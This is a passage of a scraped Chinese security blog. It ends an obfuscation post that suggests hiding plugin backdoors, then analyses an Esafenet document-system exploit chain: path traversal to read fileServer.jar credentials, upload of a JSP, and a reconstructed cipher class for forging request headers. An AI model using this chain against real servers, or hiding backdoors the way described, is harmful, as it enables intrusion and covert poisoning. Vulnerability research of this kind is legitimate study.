再次生成这个类，我们可以发现，VerifyError的错误消失，程序成功运行，也达到了我们混淆的目的 当然我们还能做什么呢？比如 继续调整start/end/handlerLabel的顺序，只要保证程序正确流向 多个try-catch结构的交叉或者首尾重叠 关注其他的特殊结构 关注java动态语言和函数式编程的特性的实现 …….(自由发挥，主要是看IDEA的代码，当然也可以尝试去对抗反混淆工具也很有意思，也能做到欺骗实现的代码执行或者报错) 总结在这次议题分享当中我们做到了对方法、字段以及代码片段的隐藏，同时实现了自定义的方法参数以及能够让IDEA反编译报错，因此我们便可以灵活使用这些结果，提升蓝队反编译分析的难度，为攻击争取更多的时间，同时针对隐藏的混淆效果，我们也可以将其运用到写插件后门的场景，实现一个定向投毒.","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"IDEA","slug":"IDEA","permalink":"https://y4tacker.github.io/tags/IDEA/"},{"name":"FernFlower","slug":"FernFlower","permalink":"https://y4tacker.github.io/tags/FernFlower/"}]},{"title":"亿赛通电子文档安全管理系统远程代码执行漏洞浅析","slug":"year/2023/12/亿赛通电子文档安全管理系统远程代码执行漏洞浅析","date":"2023-12-13T12:28:53.000Z","updated":"2024-08-04T09:01:49.888Z","comments":true,"path":"2023/12/13/year/2023/12/亿赛通电子文档安全管理系统远程代码执行漏洞浅析/","link":"","permalink":"https://y4tacker.github.io/2023/12/13/year/2023/12/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/","excerpt":"","text":"亿赛通电子文档安全管理系统远程代码执行漏洞浅析漏洞分析最近天天曝亿赛通的漏洞，又是这个新手向的项目，有点烦其实不是很想写的，本次原理也很简单 熟悉的人可能知道这个系统在windows与linux下有点区别，在linux系统下多了一个8021端口 相较于CDGServer3服务下又臭又长的代码，这个fileserver下的代码还是很短小的 任意文件读取在com.esafenet.fileserver.controller.LinuxUpdateController#dlUltrasec下 可以看到其实这里存在一个很简单的文件读取功能，这里只要filePath与type不为空即可，很简单的目录穿越漏洞 1234567891011121314151617181920212223242526272829303132333435363738394041424344public void dlUltrasec(HttpServletRequest request, HttpServletResponse response) &#123; logger.info(&quot;进入KO下载程序！&quot;);.....省略..... String filePath = request.getParameter(&quot;path&quot;); String type = request.getParameter(&quot;type&quot;); if (StrUtil.isBlank(filePath) &amp;&amp; StrUtil.isBlank(type)) &#123; logger.error(&quot;filePath、type参数为空&quot;); return; &#125; if (&quot;1&quot;.equals(type)) &#123; type = &quot;ko&quot;; &#125; if (&quot;2&quot;.equals(type)) &#123; type = &quot;patch&quot;; &#125; filePath = this.fileService.getAbsolutePathLinux(type, filePath); File file = new File(filePath); logger.info(&quot;file exists:&quot; + file.exists()); if (file.exists()) &#123; logger.info(filePath + &quot; 文件存在&quot;); FileInputStream fis = new FileInputStream(file); response.addHeader(&quot;content-type&quot;, &quot;application/x-msdownload&quot;); response.addHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=&quot; + file.getName()); response.addHeader(&quot;Content-Length&quot;, String.valueOf(fis.available())); outputStream = response.getOutputStream(); bos = new BufferedOutputStream(outputStream); bis = new BufferedInputStream(fis); byte[] readByte = new byte[8192]; boolean var12 = false; int size; while((size = bis.read(readByte)) != -1) &#123; bos.write(readByte, 0, size); &#125; bos.flush(); &#125; else &#123; logger.error(&quot;downloadFile=&gt;文件不存在&quot; + JSON.toJSONString(resultMap)); &#125;.....省略...... 简单来看看getAbsolutePathLinux的代码逻辑 1234567891011121314151617@Value(&quot;$&#123;SQLurl&#125;&quot;)private String SQLurl;@Value(&quot;$&#123;file.path&#125;&quot;)private String basePath;public String getAbsolutePathLinux(String type, String filePath) &#123; if (!StringUtils.hasLength(this.basePath)) &#123; this.basePath = this.getResourcePath(); &#125; filePath = this.basePath + File.separator + &quot;linux&quot; + File.separator + type + File.separator + filePath; File file = new File(filePath); if (!file.exists()) &#123; file.mkdirs(); &#125; return filePath;&#125; 这个值来源于配置文件,同时我们在配置文件当中可以看到有两个参数，用户名与密码(所以也大概知道读的文件是什么了，就是这个jar包)，同时亿赛通系统的安装路径也是固定的 因此通过目录穿越，我们只需要读取/esafenet/fileServer/fileServer.jar即可 文件上传这个功能点在com.esafenet.fileserver.controller.FileController#uploadFile 在这个控制器下有两个引人注目的属性，也就是application配置中的内容 1234@Value(&quot;$&#123;server.userName&#125;&quot;)private String userName;@Value(&quot;$&#123;server.password&#125;&quot;)private String password; 上传的代码很简单，偏新手向，唯一需要注意的就是有参数校验以及加密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293public String uploadFile(@RequestParam(&quot;file&quot;) MultipartFile[] uploadfile, HttpServletRequest request) &#123;HashMap resultMap = new HashMap();.....省略...... boolean b = this.validateParamterForUpload(request, resultMap); String content; if (!b) &#123; content = CdgUtils.getInstance().sendInfo(JSON.toJSONString(resultMap)); return content; &#125; content = request.getHeader(&quot;content&quot;); String json = CdgUtils.decode(content); JSONObject jsonObject = JSON.parseObject(json); Long offset = jsonObject.getLong(&quot;offset&quot;); long total = jsonObject.getLongValue(&quot;totalSize&quot;); String md5 = jsonObject.getString(&quot;md5&quot;); String loginName = jsonObject.getString(&quot;loginName&quot;); String srcPath = jsonObject.getString(&quot;filePath&quot;); int type = jsonObject.getIntValue(&quot;type&quot;); List&lt;Map&lt;String, Object&gt;&gt; list = new ArrayList(); if (uploadfile != null &amp;&amp; uploadfile.length &gt; 0) &#123; for(int i = 0; i &lt; uploadfile.length; ++i) &#123; MultipartFile file = uploadfile[i]; if (file.getSize() != 0L) &#123; File targetfile = null; String newPath; HashMap item; if (type == 1) &#123; newPath = this.fileService.getDirPath((String)null); String filename = srcPath.substring(1); targetfile = new File(newPath, filename); if (offset != null) &#123; this.uploadByBlock(list, offset, targetfile, md5, file); &#125; else &#123; file.transferTo(targetfile); item = new HashMap(); item.put(&quot;fileSize&quot;, targetfile.length()); item.put(&quot;filePath&quot;, this.fileService.getRelativePath(targetfile.getAbsolutePath())); list.add(item); &#125; &#125; else if (type == 2) &#123; newPath = this.getbackupFilePath(srcPath); if (newPath != null) &#123; targetfile = new File(newPath); File dir = targetfile.getParentFile(); if (!dir.exists()) &#123; dir.mkdirs(); &#125; if (offset != null) &#123; this.uploadByBlock(list, offset, targetfile, md5, file); &#125; else &#123; file.transferTo(targetfile); item = new HashMap(); item.put(&quot;fileSize&quot;, targetfile.length()); item.put(&quot;filePath&quot;, this.fileService.getRelativePath(targetfile.getAbsolutePath())); list.add(item); &#125; &#125; &#125; if (targetfile.length() == total) &#123; Map&lt;String, String&gt; param = new HashMap(); param.put(&quot;md5&quot;, md5); this.fileService.deleteFileInfo(param); &#125; &#125; &#125; &#125; resultMap.put(&quot;fileList&quot;, list); resultMap.put(&quot;code&quot;, 1); resultMap.put(&quot;msg&quot;, &quot;成功&quot;); return CdgUtils.getInstance().sendInfo(JSON.toJSONString(resultMap)); &#125; logger.error(&quot;文件上传并发总数到达上限，禁止并上传&quot;); resultMap.put(&quot;code&quot;, 0); resultMap.put(&quot;msg&quot;, &quot;文件上传并发总数到达上限，禁止并上传&quot;); var4 = CdgUtils.getInstance().sendInfo(JSON.toJSONString(resultMap));&#125; catch (Exception var25) &#123; var25.printStackTrace(); logger.error(&quot;uploadFile=&gt;&quot; + var25.getMessage()); resultMap.put(&quot;code&quot;, 0); resultMap.put(&quot;msg&quot;, var25.getMessage() + &quot;&quot;); return CdgUtils.getInstance().sendInfo(JSON.toJSONString(resultMap));&#125; finally &#123; semaphoreUpload.release(); System.out.println(&quot;释放通路数：&quot; + semaphoreUpload.availablePermits());&#125;return var4;&#125; 首先这里通过validateParamterForUpload对参数做了限制，要求Header中存在content参数，同时解密后要存在以下参数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758private boolean validateParamterForUpload(HttpServletRequest request, Map&lt;String, Object&gt; resultMap) throws Exception &#123; String content = request.getHeader(&quot;content&quot;); if (!StringUtils.hasLength(content)) &#123; resultMap.put(&quot;code&quot;, 2); resultMap.put(&quot;msg&quot;, &quot;参数错误&quot;); return false; &#125; else &#123; String json = CdgUtils.decodeContent(content); if (!StringUtils.hasLength(json)) &#123; resultMap.put(&quot;code&quot;, 2); resultMap.put(&quot;msg&quot;, &quot;参数错误&quot;); return false; &#125; else &#123; JSONObject jsonObject = JSON.parseObject(json); String serverUserName = jsonObject.getString(&quot;userName&quot;); String serverPwd = jsonObject.getString(&quot;pwd&quot;); String loginName = jsonObject.getString(&quot;loginName&quot;); String filePath = jsonObject.getString(&quot;filePath&quot;); long timestamp = jsonObject.getLongValue(&quot;timestamp&quot;); Integer type = jsonObject.getInteger(&quot;type&quot;); if (!StringUtils.hasLength(serverUserName)) &#123; resultMap.put(&quot;code&quot;, 3); resultMap.put(&quot;msg&quot;, &quot;文件服务器用户名为空&quot;); return false; &#125; else if (!StringUtils.hasLength(serverPwd)) &#123; resultMap.put(&quot;code&quot;, 4); resultMap.put(&quot;msg&quot;, &quot;文件服务器用户密码为空&quot;); return false; &#125; else if (!StringUtils.hasLength(loginName)) &#123; resultMap.put(&quot;code&quot;, 5); resultMap.put(&quot;msg&quot;, &quot;CDG服务器用户登录名为空&quot;); return false; &#125; else if (!StringUtils.hasLength(String.valueOf(timestamp))) &#123; resultMap.put(&quot;code&quot;, 6); resultMap.put(&quot;msg&quot;, &quot;接口调用时间戳为空&quot;); return false; &#125; else if (type == null) &#123; resultMap.put(&quot;code&quot;, 7); resultMap.put(&quot;msg&quot;, &quot;上传类型为空&quot;); return false; &#125; else if (!serverUserName.equals(this.userName)) &#123; resultMap.put(&quot;code&quot;, 9); resultMap.put(&quot;msg&quot;, &quot;文件服务器用户名不正确&quot;); return false; &#125; else if (!serverPwd.equals(this.password)) &#123; resultMap.put(&quot;code&quot;, 10); resultMap.put(&quot;msg&quot;, &quot;文件服务器用密码不正确&quot;); return false; &#125; else if (type == 2 &amp;&amp; !StringUtils.hasLength(filePath)) &#123; resultMap.put(&quot;code&quot;, 11); resultMap.put(&quot;msg&quot;, &quot;文件备份路径为空&quot;); return false; &#125; else &#123; return true; &#125; &#125; &#125; &#125; 虽然这个站点是spring的，但是对应另一个端口的服务确是tomcat项目，因此我们只需要向对应位置写个jsp即可，具体细节不再多说 对于加密与解密我这里整理了一下，梳理了下最小逻辑 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527import java.lang.reflect.Array;import java.security.InvalidKeyException;import java.security.MessageDigest;import java.util.concurrent.ConcurrentHashMap;public class Y4Uitls &#123; static final int[] alog = new int[256]; static final int[] log = new int[256]; static final byte[] S = new byte[256]; static final byte[] Si = new byte[256]; static final int[] T1 = new int[256]; static final int[] T2 = new int[256]; static final int[] T3 = new int[256]; static final int[] T4 = new int[256]; static final int[] T5 = new int[256]; static final int[] T6 = new int[256]; static final int[] T7 = new int[256]; static final int[] T8 = new int[256]; static final int[] U1 = new int[256]; static final int[] U2 = new int[256]; static final int[] U3 = new int[256]; static final int[] U4 = new int[256]; static final byte[] rcon = new byte[30]; static final int[][][] shifts = new int[][][]&#123;&#123;new int[2], &#123;1, 3&#125;, &#123;2, 2&#125;, &#123;3, 1&#125;&#125;, &#123;new int[2], &#123;1, 5&#125;, &#123;2, 4&#125;, &#123;3, 3&#125;&#125;, &#123;new int[2], &#123;1, 7&#125;, &#123;3, 5&#125;, &#123;4, 4&#125;&#125;&#125;; private static final char[] HEX_DIGITS = new char[]&#123;&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;&#125;; private static byte remain_low; private static byte remain_up; private static byte upper_bit_add_0100; private static byte upper_bit_add_0101; private static byte[] key2; private static final int ENCRYPT_GROUP_LEN = 16; private static final int BLOCK_LEN = 16; private volatile ConcurrentHashMap&lt;String, Integer&gt; clientStatusMap = new ConcurrentHashMap(1000); private static char[] hexDigits; private static String publicKey; public static final String KEY_ALGORITHM = &quot;RSA&quot;; private static final int MAX_DECRYPT_BLOCK = 128; private String hardId = &quot;&quot;; private static MessageDigest messagedigest; static &#123; remain_low = (byte)15; remain_up = (byte)-16; upper_bit_add_0100 = (byte)64; upper_bit_add_0101 = (byte)80; key2 = new byte[]&#123;-21, -112, 90, -68, 5, 44, 85, -86, -21, -112, 90, -68, 5, 44, 85, -86&#125;; hexDigits = new char[]&#123;&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;&#125;; publicKey = &quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCdd6QFVUF/86PA5EH0z0QcGDqCV7vKZA7DdNK6wYiA1TY1iRxKpsgWRgh4eTOxzdHdpEmvGZro/rxB5cDO3f/zui5jH+FK+EZZ4WL/6SbdYL1EmxOqj2E7WNhM4hCcai3oaqvvTuZOXZVeP4leHA4CGswvOlpUXTU6tbpcXYe6+wIDAQAB&quot;; messagedigest = null; &#125; static &#123; alog[0] = 1; int var2; int var16; for(var2 = 1; var2 &lt; 256; ++var2) &#123; var16 = alog[var2 - 1] &lt;&lt; 1 ^ alog[var2 - 1]; if ((var16 &amp; 256) != 0) &#123; var16 ^= 283; &#125; alog[var2] = var16; &#125; for(var2 = 1; var2 &lt; 255; log[alog[var2]] = var2++) &#123; &#125; byte[][] var4 = new byte[][]&#123;&#123;1, 1, 1, 1, 1, 0, 0, 0&#125;, &#123;0, 1, 1, 1, 1, 1, 0, 0&#125;, &#123;0, 0, 1, 1, 1, 1, 1, 0&#125;, &#123;0, 0, 0, 1, 1, 1, 1, 1&#125;, &#123;1, 0, 0, 0, 1, 1, 1, 1&#125;, &#123;1, 1, 0, 0, 0, 1, 1, 1&#125;, &#123;1, 1, 1, 0, 0, 0, 1, 1&#125;, &#123;1, 1, 1, 1, 0, 0, 0, 1&#125;&#125;; byte[] var5 = new byte[]&#123;0, 1, 1, 0, 0, 0, 1, 1&#125;; byte[][] var7 = new byte[256][8]; var7[1][7] = 1; int var6; for(var2 = 2; var2 &lt; 256; ++var2) &#123; var16 = alog[255 - log[var2]]; for(var6 = 0; var6 &lt; 8; ++var6) &#123; var7[var2][var6] = (byte)(var16 &gt;&gt;&gt; 7 - var6 &amp; 1); &#125; &#125; byte[][] var8 = new byte[256][8]; for(var2 = 0; var2 &lt; 256; ++var2) &#123; for(var6 = 0; var6 &lt; 8; ++var6) &#123; var8[var2][var6] = var5[var6]; for(var16 = 0; var16 &lt; 8; ++var16) &#123; var8[var2][var6] = (byte)(var8[var2][var6] ^ var4[var6][var16] * var7[var2][var16]); &#125; &#125; &#125; for(var2 = 0; var2 &lt; 256; ++var2) &#123; S[var2] = (byte)(var8[var2][0] &lt;&lt; 7); for(var6 = 1; var6 &lt; 8; ++var6) &#123; byte[] var10000 = S; var10000[var2] = (byte)(var10000[var2] ^ var8[var2][var6] &lt;&lt; 7 - var6); &#125; Si[S[var2] &amp; 255] = (byte)var2; &#125; byte[][] var9 = new byte[][]&#123;&#123;2, 1, 1, 3&#125;, &#123;3, 2, 1, 1&#125;, &#123;1, 3, 2, 1&#125;, &#123;1, 1, 3, 2&#125;&#125;; byte[][] var10 = new byte[4][8]; for(var2 = 0; var2 &lt; 4; ++var2) &#123; for(var16 = 0; var16 &lt; 4; ++var16) &#123; var10[var2][var16] = var9[var2][var16]; &#125; var10[var2][var2 + 4] = 1; &#125; byte[][] var13 = new byte[4][4]; for(var2 = 0; var2 &lt; 4; ++var2) &#123; byte var11 = var10[var2][var2]; if (var11 == 0) &#123; for(var6 = var2 + 1; var10[var6][var2] == 0 &amp;&amp; var6 &lt; 4; ++var6) &#123; &#125; if (var6 == 4) &#123; throw new RuntimeException(&quot;G matrix is not invertible&quot;); &#125; for(var16 = 0; var16 &lt; 8; ++var16) &#123; byte var12 = var10[var2][var16]; var10[var2][var16] = var10[var6][var16]; var10[var6][var16] = var12; &#125; var11 = var10[var2][var2]; &#125; for(var16 = 0; var16 &lt; 8; ++var16) &#123; if (var10[var2][var16] != 0) &#123; var10[var2][var16] = (byte)alog[(255 + log[var10[var2][var16] &amp; 255] - log[var11 &amp; 255]) % 255]; &#125; &#125; for(var6 = 0; var6 &lt; 4; ++var6) &#123; if (var2 != var6) &#123; for(var16 = var2 + 1; var16 &lt; 8; ++var16) &#123; var10[var6][var16] = (byte)(var10[var6][var16] ^ mul(var10[var2][var16], var10[var6][var2])); &#125; var10[var6][var2] = 0; &#125; &#125; &#125; for(var2 = 0; var2 &lt; 4; ++var2) &#123; for(var16 = 0; var16 &lt; 4; ++var16) &#123; var13[var2][var16] = var10[var2][var16 + 4]; &#125; &#125; for(var6 = 0; var6 &lt; 256; ++var6) &#123; byte var14 = S[var6]; T1[var6] = mul4(var14, var9[0]); T2[var6] = mul4(var14, var9[1]); T3[var6] = mul4(var14, var9[2]); T4[var6] = mul4(var14, var9[3]); var14 = Si[var6]; T5[var6] = mul4(var14, var13[0]); T6[var6] = mul4(var14, var13[1]); T7[var6] = mul4(var14, var13[2]); T8[var6] = mul4(var14, var13[3]); U1[var6] = mul4(var6, var13[0]); U2[var6] = mul4(var6, var13[1]); U3[var6] = mul4(var6, var13[2]); U4[var6] = mul4(var6, var13[3]); &#125; rcon[0] = 1; int var15 = 1; for(var6 = 1; var6 &lt; 30; rcon[var6++] = (byte)(var15 = mul(2, var15))) &#123; &#125; &#125; static final int mul(int var0, int var1) &#123; return var0 != 0 &amp;&amp; var1 != 0 ? alog[(log[var0 &amp; 255] + log[var1 &amp; 255]) % 255] : 0; &#125; static final int mul4(int var0, byte[] var1) &#123; if (var0 == 0) &#123; return 0; &#125; else &#123; var0 = log[var0 &amp; 255]; int var2 = var1[0] != 0 ? alog[(var0 + log[var1[0] &amp; 255]) % 255] &amp; 255 : 0; int var3 = var1[1] != 0 ? alog[(var0 + log[var1[1] &amp; 255]) % 255] &amp; 255 : 0; int var4 = var1[2] != 0 ? alog[(var0 + log[var1[2] &amp; 255]) % 255] &amp; 255 : 0; int var5 = var1[3] != 0 ? alog[(var0 + log[var1[3] &amp; 255]) % 255] &amp; 255 : 0; return var2 &lt;&lt; 24 | var3 &lt;&lt; 16 | var4 &lt;&lt; 8 | var5; &#125; &#125; public static Object makeKey(byte[] var0) throws InvalidKeyException &#123; return makeKey(var0, 16); &#125; public static byte[] blockEncrypt(byte[] var0, int var1, Object var2) &#123; int[][] var3 = (int[][])((Object[])var2)[0]; int var4 = var3.length - 1; int[] var5 = var3[0]; int var6 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[0]; int var7 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[1]; int var8 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[2]; int var9 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[3]; for(int var14 = 1; var14 &lt; var4; ++var14) &#123; var5 = var3[var14]; int var10 = T1[var6 &gt;&gt;&gt; 24 &amp; 255] ^ T2[var7 &gt;&gt;&gt; 16 &amp; 255] ^ T3[var8 &gt;&gt;&gt; 8 &amp; 255] ^ T4[var9 &amp; 255] ^ var5[0]; int var11 = T1[var7 &gt;&gt;&gt; 24 &amp; 255] ^ T2[var8 &gt;&gt;&gt; 16 &amp; 255] ^ T3[var9 &gt;&gt;&gt; 8 &amp; 255] ^ T4[var6 &amp; 255] ^ var5[1]; int var12 = T1[var8 &gt;&gt;&gt; 24 &amp; 255] ^ T2[var9 &gt;&gt;&gt; 16 &amp; 255] ^ T3[var6 &gt;&gt;&gt; 8 &amp; 255] ^ T4[var7 &amp; 255] ^ var5[2]; int var13 = T1[var9 &gt;&gt;&gt; 24 &amp; 255] ^ T2[var6 &gt;&gt;&gt; 16 &amp; 255] ^ T3[var7 &gt;&gt;&gt; 8 &amp; 255] ^ T4[var8 &amp; 255] ^ var5[3]; var6 = var10; var7 = var11; var8 = var12; var9 = var13; &#125; byte[] var15 = new byte[16]; var5 = var3[var4]; int var16 = var5[0]; var15[0] = (byte)(S[var6 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[1] = (byte)(S[var7 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[2] = (byte)(S[var8 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[3] = (byte)(S[var9 &amp; 255] ^ var16); var16 = var5[1]; var15[4] = (byte)(S[var7 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[5] = (byte)(S[var8 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[6] = (byte)(S[var9 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[7] = (byte)(S[var6 &amp; 255] ^ var16); var16 = var5[2]; var15[8] = (byte)(S[var8 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[9] = (byte)(S[var9 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[10] = (byte)(S[var6 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[11] = (byte)(S[var7 &amp; 255] ^ var16); var16 = var5[3]; var15[12] = (byte)(S[var9 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[13] = (byte)(S[var6 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[14] = (byte)(S[var7 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[15] = (byte)(S[var8 &amp; 255] ^ var16); return var15; &#125; public static byte[] blockDecrypt(byte[] var0, int var1, Object var2) &#123; int[][] var3 = (int[][])((Object[])var2)[1]; int var4 = var3.length - 1; int[] var5 = var3[0]; int var6 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[0]; int var7 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[1]; int var8 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[2]; int var9 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[3]; for(int var14 = 1; var14 &lt; var4; ++var14) &#123; var5 = var3[var14]; int var10 = T5[var6 &gt;&gt;&gt; 24 &amp; 255] ^ T6[var9 &gt;&gt;&gt; 16 &amp; 255] ^ T7[var8 &gt;&gt;&gt; 8 &amp; 255] ^ T8[var7 &amp; 255] ^ var5[0]; int var11 = T5[var7 &gt;&gt;&gt; 24 &amp; 255] ^ T6[var6 &gt;&gt;&gt; 16 &amp; 255] ^ T7[var9 &gt;&gt;&gt; 8 &amp; 255] ^ T8[var8 &amp; 255] ^ var5[1]; int var12 = T5[var8 &gt;&gt;&gt; 24 &amp; 255] ^ T6[var7 &gt;&gt;&gt; 16 &amp; 255] ^ T7[var6 &gt;&gt;&gt; 8 &amp; 255] ^ T8[var9 &amp; 255] ^ var5[2]; int var13 = T5[var9 &gt;&gt;&gt; 24 &amp; 255] ^ T6[var8 &gt;&gt;&gt; 16 &amp; 255] ^ T7[var7 &gt;&gt;&gt; 8 &amp; 255] ^ T8[var6 &amp; 255] ^ var5[3]; var6 = var10; var7 = var11; var8 = var12; var9 = var13; &#125; byte[] var15 = new byte[16]; var5 = var3[var4]; int var16 = var5[0]; var15[0] = (byte)(Si[var6 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[1] = (byte)(Si[var9 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[2] = (byte)(Si[var8 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[3] = (byte)(Si[var7 &amp; 255] ^ var16); var16 = var5[1]; var15[4] = (byte)(Si[var7 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[5] = (byte)(Si[var6 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[6] = (byte)(Si[var9 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[7] = (byte)(Si[var8 &amp; 255] ^ var16); var16 = var5[2]; var15[8] = (byte)(Si[var8 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[9] = (byte)(Si[var7 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[10] = (byte)(Si[var6 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[11] = (byte)(Si[var9 &amp; 255] ^ var16); var16 = var5[3]; var15[12] = (byte)(Si[var9 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[13] = (byte)(Si[var8 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[14] = (byte)(Si[var7 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[15] = (byte)(Si[var6 &amp; 255] ^ var16); return var15; &#125; public static synchronized Object makeKey(byte[] var0, int var1) throws InvalidKeyException &#123; if (var0 == null) &#123; throw new InvalidKeyException(&quot;Empty key&quot;); &#125; else if (var0.length != 16 &amp;&amp; var0.length != 24 &amp;&amp; var0.length != 32) &#123; throw new InvalidKeyException(&quot;Incorrect key length&quot;); &#125; else &#123; int var2 = getRounds(var0.length, var1); int var3 = var1 / 4; int[][] var4 = new int[var2 + 1][var3]; int[][] var5 = new int[var2 + 1][var3]; int var6 = (var2 + 1) * var3; int var7 = var0.length / 4; int[] var8 = new int[var7]; int var9 = 0; int var10; for(var10 = 0; var9 &lt; var7; var8[var9++] = (var0[var10++] &amp; 255) &lt;&lt; 24 | (var0[var10++] &amp; 255) &lt;&lt; 16 | (var0[var10++] &amp; 255) &lt;&lt; 8 | var0[var10++] &amp; 255) &#123; &#125; int var11 = 0; for(var10 = 0; var10 &lt; var7 &amp;&amp; var11 &lt; var6; ++var11) &#123; var4[var11 / var3][var11 % var3] = var8[var10]; var5[var2 - var11 / var3][var11 % var3] = var8[var10]; ++var10; &#125; int var13 = 0; int var12; while(var11 &lt; var6) &#123; var12 = var8[var7 - 1]; var8[0] ^= (S[var12 &gt;&gt;&gt; 16 &amp; 255] &amp; 255) &lt;&lt; 24 ^ (S[var12 &gt;&gt;&gt; 8 &amp; 255] &amp; 255) &lt;&lt; 16 ^ (S[var12 &amp; 255] &amp; 255) &lt;&lt; 8 ^ S[var12 &gt;&gt;&gt; 24 &amp; 255] &amp; 255 ^ (rcon[var13++] &amp; 255) &lt;&lt; 24; int var10001; if (var7 != 8) &#123; var9 = 1; for(var10 = 0; var9 &lt; var7; var8[var10001] ^= var8[var10++]) &#123; var10001 = var9++; &#125; &#125; else &#123; var9 = 1; for(var10 = 0; var9 